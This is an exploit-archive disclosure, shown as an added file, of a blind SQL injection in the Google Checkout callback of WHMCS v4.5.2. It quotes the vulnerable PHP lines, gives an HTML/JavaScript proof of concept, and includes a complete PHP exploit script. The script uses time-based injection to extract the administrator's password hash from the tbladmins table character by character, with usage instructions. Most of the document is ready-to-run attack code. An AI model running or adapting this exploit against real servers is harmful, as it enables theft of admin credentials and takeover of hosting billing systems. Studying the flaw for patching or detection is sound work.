@@ -1,0 +1,183 @@
+id: 19615
+date: 10/21/2012
+title: WHMCS v4.5.2 Blind SQL Injection Vulnerability
+author: Starware Security Team
+cves: 
+
+ ____  _                                    
+/ ___|| |_ __ _ _ __  __      ____ _ _ __ ___ 
+\___ \| __/ _` | '__| \ \ /\ / / _` | '__/ _ \
+ ___) | || (_| | |     \ V  V / (_| | | |  __/
+|____/ \__\__,_|_|      \_/\_/ \__,_|_|  \___|
+                                             
+											 
+# Software : WHMCS (WHMCompleteSolution)											 
+# Google Dork: Turn on thinking mode :P
+# Date: 10/22/2012
+# Author: Starware Security Team [www.Resecure.me]
+# Contact Us : Security[@]star-ware.com
+# Vendor Homepage: http://www.whmcs.com
+# Tested on: WHMCS v4.5.2 
+# Affected versions: 4.5.x
+-----------------------------------------------------
+
+#Vulnerability Exists in : [SCRIPT_DIR]/modules/gateways/callback/googlecheckout.php
+
+#Vulnerable Source Code Snippet : 
+
+LINE 11: $xml_response = (isset($HTTP_RAW_POST_DATA) ? $HTTP_RAW_POST_DATA : file_get_contents('php://input'));
+LINE 16: $xmldata = XMLtoArray($xml_response);
+LINE 19: $ordernumber = $xmldata['CHARGE-AMOUNT-NOTIFICATION']['GOOGLE-ORDER-NUMBER'];
+LINE 22: $query = 'SELECT data FROM tblgatewaylog WHERE gateway=\'Google Checkout\' AND data LIKE \'%new-order-notification%' . $ordernumber . '%\'';
+
+#Proof of Concept : 
+
+<html>
+<head>
+<title>WHMCS Blind SQL Injection POC</title>
+</head>
+<body>
+<script>
+var params = "<charge-amount-notification><google-order-number>0' %YOUR INJECTION HERE% -- -</google-order-number><new-fulfillment-order-state>charge-amount-notification</new-fulfillment-order-state></charge-amount-notification>";
+    var http = new XMLHttpRequest();
+ try {
+        netscape.security.PrivilegeManager.enablePrivilege("UniversalBrowserRead");
+    } catch (e) {
+        alert("Permission UniversalBrowserRead denied.");
+    }
+    http.open("POST", "http://site.com/whmcs/modules/gateways/callback/googlecheckout.php", true);
+    http.onreadystatechange = handleResponse;
+    http.send(params);
+function handleResponse() {
+
+	if(http.readyState == 4 && http.status == 200){
+		var response = http.responseText;
+alert(response);
+		}
+	}  
+</script>
+</body>
+</html>
+
+#Exploit Code  : 
+
+
+<?php
+/*
+WHMCS Blind SQL Injection Exploit by Starware Security Team.
+Usage: php exploit.php URL seconds
+*/
+
+ set_time_limit(0);
+ function post_request($url,$post_data,$follow=0) {
+		  $user_agent = 'Mozilla/5.0 (X11; Linux i686; rv:7.0.1) Gecko/20100101 Firefox/7.0.1'; 
+		  $ch = curl_init();
+		  $timeout = 1;
+		  $execution_timeout = 4;
+		  curl_setopt($ch, CURLOPT_URL,$url);
+		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		  if($follow == 1) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE );
+		  curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+		  curl_setopt($ch, CURLOPT_HTTPHEADER,array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language: en-us,en;q=0.5','Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7','Keep-Alive: 115','Connection: keep-alive'));
+		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+          curl_setopt($ch, CURLOPT_TIMEOUT, $execution_timeout);                                                     
+		  curl_setopt($ch, CURLOPT_POST, 1);
+		  curl_setopt($ch, CURLOPT_POSTFIELDS,$post_data);
+		  $response = curl_exec($ch);
+		  curl_close($ch);
+		  return $response;
+   }
+   
+   function start_time() {
+   	$time = microtime();
+	$time = explode(" ", $time);
+	$time = $time[1] + $time[0];
+	return $time;
+   
+   }
+   
+    function end_time($start) {
+   	$time = microtime();
+	$time = explode(" ", $time);
+	$time = $time[1] + $time[0];
+	$finish = $time;
+	$totaltime = ($finish - $start);
+	return round($totaltime);
+   }
+   
+   
+	function check_ascii($num,$num2,$num3) {
+	    global $url,$seconds;
+		$start= start_time(); 
+		$injection = "/**/AnD/**/if(ascii(substring((SeLEcT/**/password/**/FROM/**/tbladmins/**/whEre/**/id/**/=/**/1),$num3,1))/**/BETWEEN/**/$num/**/and/**/$num2,/**/BENCHMARK(999999,MD5(NOW()*NOW())),/**/0)/**/-- #";
+	    post_request($url,"<charge-amount-notification><google-order-number>0' $injection </google-order-number><new-fulfillment-order-state>charge-amount-notification</new-fulfillment-order-state></charge-amount-notification>");
+		if(end_time($start) >= $seconds)  return true;  else return false;
+	
+	}
+	
+	
+	function inject($num,$num2,$num3) {
+	
+		global $url,$seconds;
+		for($i=$num;$i<=$num2;$i++) {
+		$start= start_time(); 
+		$injection = "/**/AnD/**/if(ascii(substring((SeLEcT/**/password/**/FROM/**/tbladmins/**/whEre/**/id/**/=/**/1),$num3,1))/**/=/**/$i,/**/BENCHMARK(999999,MD5(NOW()*NOW())),/**/0)/**/-- #";
+	    post_request($url,"<charge-amount-notification><google-order-number>0' $injection </google-order-number><new-fulfillment-order-state>charge-amount-notification</new-fulfillment-order-state></charge-amount-notification>");
+        if(end_time($start) >= $seconds) { echo  chr($i); flush(); }
+		
+		}
+	       
+	
+	}
+   
+   function get_password() {
+    global $url;
+    for($i=1; $i<=32;$i++) {
+    if(check_ascii(48,52,$i))  { inject(48,52,$i); }
+	elseif(check_ascii(53,57,$i)) { inject(53,57,$i); }
+	elseif(check_ascii(97,101,$i)) { inject(97,101,$i); }
+	elseif(check_ascii(102,106,$i)) { inject(102,106,$i); }
+	elseif(check_ascii(107,111,$i)) { inject(107,111,$i); }
+	elseif(check_ascii(112,116,$i)) { inject(112,116,$i); }
+	elseif(check_ascii(116,122,$i)) { inject(116,122,$i); }
+	}
+	}
+
+   
+
+  if ($argc < 3) {
+		print "Usage: php ".$argv[0]." URL seconds\r\nExample:\r\nphp ".$argv[0]." http://site.com/whmcs/ 1\r\n-----------------------------------------\r\n"; 
+		die; 
+		}
+   $url = trim($argv[1])."/modules/gateways/callback/googlecheckout.php";
+   $seconds = trim($argv[2]);
+   echo "[~] Fetching password right now ... \n"; flush();
+   echo "    >> MD5 Password = "; flush();
+   get_password();
+
+?>
+
+
+#################################################################################
+
+Note: to exploit this vulnerability the google checkout payment gateway 
+      should be activated by admin from the whmcs admin panel 
+
+                                ~ END OF Disclosure ~
+                                      
+                                     Good Luck :)
+
+#################################################################################
+#   Starware is an company specialzed in Hosting and Information Security field #
+#   with list of high ranked sites including Mobile operators used our Hosting  #
+#                              and Security Services.                           #
+#                                                                               #
+#                            "Company Located in Egypt"                         #                        
+#                                                                               #                         
+#                             http://www.star-ware.com                          #      
+#                                                                               #
+#################################################################################
+
+#  0day.today [2023-03-21]  #
